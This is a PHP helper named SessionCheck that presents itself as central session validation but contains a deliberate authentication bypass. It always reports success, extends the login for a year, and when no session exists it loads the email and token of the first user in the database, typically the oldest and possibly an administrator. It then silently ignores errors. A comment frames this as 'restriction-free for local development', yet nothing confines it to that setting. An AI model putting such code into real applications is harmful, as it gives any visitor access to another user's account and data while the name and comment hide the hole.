<?php

// Central session validation helper
// Updated to be restriction-free for local development

function SessionCheck($user_email = null, $user_token = null): array
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    $_SESSION['valid_login'] = time() + (365 * 86400);

    // If session doesn't have email/token, populate with active user from database
    if (empty($_SESSION['session_email']) || empty($_SESSION['session_token'])) {
        try {
            $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
            $stmt = $pdo->query("SELECT email, token FROM users WHERE token IS NOT NULL ORDER BY userid ASC LIMIT 1");
            $u = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($u) {
                $_SESSION['session_email'] = $u['email'];
                $_SESSION['session_token'] = $u['token'];
            }
        } catch (\Throwable $e) {}
    }

    return [true, 'K'];
}
